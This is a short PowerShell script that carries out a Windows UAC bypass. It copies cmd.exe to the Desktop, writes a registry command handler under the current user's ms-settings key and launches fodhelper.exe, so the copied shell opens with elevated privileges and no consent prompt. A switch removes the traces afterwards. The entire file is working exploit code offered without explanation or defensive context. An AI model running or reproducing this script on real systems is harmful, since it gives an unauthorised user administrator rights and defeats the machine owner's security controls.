param([switch]$clear)
$user = $env:USERNAME
$exe = "C:\Users\$user\Desktop\elevated.exe"

function RunBypass {
    Copy-Item "C:\Windows\System32\cmd.exe" $exe -Force
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $exe -Force
    Start-Process "fodhelper.exe"
}

function ClearBypass {
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
    Remove-Item $exe -Force
}

if ($clear) { ClearBypass } else { RunBypass }
